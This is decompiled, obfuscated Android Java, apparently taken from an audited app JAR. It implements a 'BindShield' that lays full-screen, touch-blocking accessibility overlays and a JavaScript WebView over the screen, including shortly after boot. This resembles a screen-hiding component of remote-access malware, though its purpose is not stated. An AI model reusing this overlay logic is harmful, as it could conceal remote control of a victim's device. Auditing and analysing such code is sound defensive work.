// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.R;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import java.util.Iterator;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.function.Consumer;
import lyr.stable.runtime.ScreenMirrorService;
import w1.g8;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class w {

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static FrameLayout f1339b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static FrameLayout f1340c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static WebView f1341d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static WindowManager f1342e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static g8 f1343f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static volatile boolean f1344g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static volatile boolean f1345h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static volatile long f1346i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static volatile int f1347j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public static volatile Context f1348k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static boolean f1349l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public static boolean f1350m;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final Handler f1338a = new Handler(Looper.getMainLooper());
    public static final CopyOnWriteArrayList n = new CopyOnWriteArrayList();

    public static FrameLayout a(ScreenMirrorService screenMirrorService, int i3) {
        FrameLayout frameLayout = new FrameLayout(screenMirrorService);
        frameLayout.setBackgroundColor(i3);
        frameLayout.getBackground().setAlpha(255);
        frameLayout.setClickable(true);
        frameLayout.setFocusable(false);
        frameLayout.setOnTouchListener(new v(0));
        return frameLayout;
    }

    public static void b() {
        boolean z2 = f1344g;
        if (z2) {
            Log.i("BindShield", "BOOT_SHIELD_HIDE|flow_complete=" + f1345h);
        }
        f1347j++;
        f1344g = false;
        l.l0(f1348k, false);
        g8 g8Var = f1343f;
        f1343f = null;
        if (g8Var != null) {
            g8Var.close();
        }
        WebView webView = f1341d;
        h(f1340c);
        h(f1339b);
        if (webView != null) {
            try {
                webView.stopLoading();
                webView.destroy();
            } catch (Throwable unused) {
            }
        }
        f1339b = null;
        f1340c = null;
        f1341d = null;
        f1342e = null;
        if (z2) {
            c(false);
        }
    }

    public static void c(boolean z2) {
        Iterator it = n.iterator();
        while (it.hasNext()) {
            try {
                ((Consumer) it.next()).accept(Boolean.valueOf(z2));
            } catch (Throwable th) {
                a0.a.p(th, new StringBuilder("shield state listener failed: "), "BindShield");
            }
        }
    }

    public static void d() {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f1338a.post(new d2.r(3));
            return;
        }
        WindowManager windowManager = f1342e;
        if (windowManager == null) {
            return;
        }
        try {
            FrameLayout frameLayout = f1339b;
            if (frameLayout != null) {
                windowManager.updateViewLayout(frameLayout, g(windowManager, 21497656));
            }
            FrameLayout frameLayout2 = f1340c;
            if (frameLayout2 != null) {
                windowManager.updateViewLayout(frameLayout2, g(windowManager, R.drawable.numberpicker_up_focused_holo_dark));
            }
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("BOOT_SHIELD_LAYOUT_ERR|"), "BindShield");
        }
        g8 g8Var = f1343f;
        if (g8Var != null) {
            g8Var.D();
        }
    }

    public static void e(Context context) {
        f1345h = true;
        f1346i = 0L;
        f1349l = false;
        if (context != null) {
            try {
                c2.p.e(context, "bind_shield").edit().putBoolean("pref_bind_shield_flow_complete", true).apply();
                int i3 = c2.q.f456b;
                c2.u.r(context, "setup_complete");
            } catch (Throwable unused) {
            }
        }
        if (context == null) {
            context = f1348k;
        }
        l.l0(context, false);
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f1338a.post(new d2.r(2));
        } else {
            b();
        }
    }

    public static void f() {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f1338a.post(new d2.r(1));
            return;
        }
        if (f1344g || f1339b != null || f1340c != null) {
            Log.i("BindShield", "BOOT_SHIELD_DETACHED|flow_complete=" + f1345h);
        }
        boolean z2 = f1344g;
        f1347j++;
        f1344g = false;
        l.l0(f1348k, false);
        g8 g8Var = f1343f;
        f1343f = null;
        if (g8Var != null) {
            g8Var.close();
        }
        WebView webView = f1341d;
        h(f1340c);
        h(f1339b);
        if (webView != null) {
            try {
                webView.stopLoading();
                webView.destroy();
            } catch (Throwable unused) {
            }
        }
        f1339b = null;
        f1340c = null;
        f1341d = null;
        f1342e = null;
        if (z2) {
            c(false);
        }
    }

    public static WindowManager.LayoutParams g(WindowManager windowManager, int i3) {
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, g8.A(windowManager), 2032, i3, -3);
        layoutParams.gravity = 8388659;
        layoutParams.x = 0;
        layoutParams.y = 0;
        g8.y(layoutParams);
        return layoutParams;
    }

    public static void h(View view) {
        WindowManager windowManager;
        if (view == null || (windowManager = f1342e) == null) {
            return;
        }
        try {
            windowManager.removeView(view);
        } catch (Throwable unused) {
        }
    }

    public static void i(ScreenMirrorService screenMirrorService) {
        boolean z2;
        long j3;
        FrameLayout frameLayout;
        int i3 = 0;
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f1338a.post(new t(screenMirrorService, i3));
            return;
        }
        Context applicationContext = screenMirrorService.getApplicationContext();
        if (applicationContext == null) {
            applicationContext = screenMirrorService;
        }
        f1348k = applicationContext;
        long j4 = 0;
        if (f1345h || l.o(screenMirrorService)) {
            f1345h = true;
            f1346i = 0L;
            f1349l = false;
            if (f1344g) {
                Log.i("BindShield", "BOOT_SHIELD_HIDE|flow_already_complete");
                b();
                return;
            }
            g8 g8Var = f1343f;
            f1343f = null;
            if (g8Var != null) {
                g8Var.close();
                return;
            }
            return;
        }
        if (f1344g && (frameLayout = f1339b) != null && frameLayout.getWindowToken() != null) {
            g8 g8Var2 = f1343f;
            if (g8Var2 != null) {
                g8Var2.D();
                return;
            }
            return;
        }
        if (f1344g) {
            Log.i("BindShield", "BOOT_SHIELD_REATTACH");
            f1347j++;
            f1344g = false;
            g8 g8Var3 = f1343f;
            f1343f = null;
            if (g8Var3 != null) {
                g8Var3.close();
            }
            WebView webView = f1341d;
            h(f1340c);
            h(f1339b);
            if (webView != null) {
                try {
                    webView.stopLoading();
                    webView.destroy();
                } catch (Throwable unused) {
                }
            }
            f1339b = null;
            f1340c = null;
            f1341d = null;
            f1342e = null;
        }
        try {
            long jElapsedRealtime = SystemClock.elapsedRealtime();
            if (f1346i <= 0) {
                f1346i = jElapsedRealtime;
            }
            if (!f1349l) {
                try {
                    z2 = c2.p.e(screenMirrorService, "bind_shield").getBoolean("pref_boot_shield_armed_by_boot", false);
                } catch (Throwable unused2) {
                    z2 = false;
                }
                try {
                    j3 = c2.p.e(screenMirrorService, "bind_shield").getLong("pref_boot_shield_armed_until", 0L);
                } catch (Throwable unused3) {
                    j3 = 0;
                }
                f1350m = z2 && j3 > System.currentTimeMillis() && SystemClock.elapsedRealtime() < 65000;
                f1349l = true;
            }
            boolean z3 = f1350m;
            long j5 = f1346i;
            if (j5 > 0 && jElapsedRealtime > j5) {
                j4 = jElapsedRealtime - j5;
            }
            int i4 = z3 ? -1 : -15198184;
            int i5 = f1347j + 1;
            f1347j = i5;
            WindowManager windowManager = (WindowManager) screenMirrorService.getSystemService("window");
            f1342e = windowManager;
            if (windowManager == null) {
                return;
            }
            f1339b = a(screenMirrorService, i4);
            f1340c = a(screenMirrorService, 16777216);
            WebView webView2 = new WebView(screenMirrorService);
            f1341d = webView2;
            webView2.setBackgroundColor(i4);
            webView2.setFitsSystemWindows(false);
            webView2.setWebViewClient(new WebViewClient());
            webView2.getSettings().setJavaScriptEnabled(true);
            FrameLayout frameLayout2 = f1339b;
            if (frameLayout2 != null) {
                frameLayout2.setImportantForAccessibility(1);
                i0.c(frameLayout2);
            }
            FrameLayout frameLayout3 = f1340c;
            if (frameLayout3 != null) {
                frameLayout3.setImportantForAccessibility(4);
                i0.c(frameLayout3);
            }
            webView2.setImportantForAccessibility(1);
            i0.c(webView2);
            f1339b.addView(webView2, new FrameLayout.LayoutParams(-1, -1));
            g8.C(f1339b);
            g8.C(f1340c);
            WindowManager windowManager2 = f1342e;
            windowManager2.addView(f1339b, g(windowManager2, 21497656));
            WindowManager windowManager3 = f1342e;
            windowManager3.addView(f1340c, g(windowManager3, R.drawable.numberpicker_up_focused_holo_dark));
            f1343f = g8.w(screenMirrorService, f1339b, f1340c);
            f1344g = true;
            l.l0(f1348k, true);
            c(true);
            Log.i("BindShield", "BOOT_SHIELD_SETUP_ADDVIEW_OK generation=" + i5 + " elapsedMs=" + j4);
            u uVar = new u(screenMirrorService, webView2, i5, z3, j4);
            StringBuilder sb = new StringBuilder("bind-f5-");
            sb.append(i5);
            new Thread(uVar, sb.toString()).start();
        } catch (Throwable th) {
            Log.w("BindShield", "BOOT_SHIELD_OVERLAY_ERR|" + th.getMessage());
            b();
        }
    }
}
